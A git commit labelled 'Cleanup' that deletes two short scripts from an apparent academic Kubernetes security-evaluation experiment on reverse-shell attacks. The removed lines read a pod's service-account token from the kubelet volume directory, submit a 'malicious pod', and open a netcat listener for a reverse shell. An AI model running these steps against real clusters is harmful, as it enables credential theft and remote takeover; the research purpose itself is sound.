6be16c4faf6b00fc82f54182cef2cce62b63ac15
eddy truyen <eddy.truyen@cs.kuleuven.be>
2025-08-01 13:27:32 +0000

    Cleanup

--- experiments/security-evaluation/ReverseShellAttack/get_token.sh
+++
@@ -1,3 +0,0 @@
-pod_uid=$(./get_uid_of_cass_pod.sh)
-cat /var/lib/kubelet/pods/"$pod_uid"/volumes/kubernetes.io~projected/kube-api-access-w678m/token 
-
--- experiments/security-evaluation/ReverseShellAttack/reverse-shell-script.sh
+++
@@ -1,3 +0,0 @@
-./submit-malicious-pod.sh
-nc -lvnp 8080
-
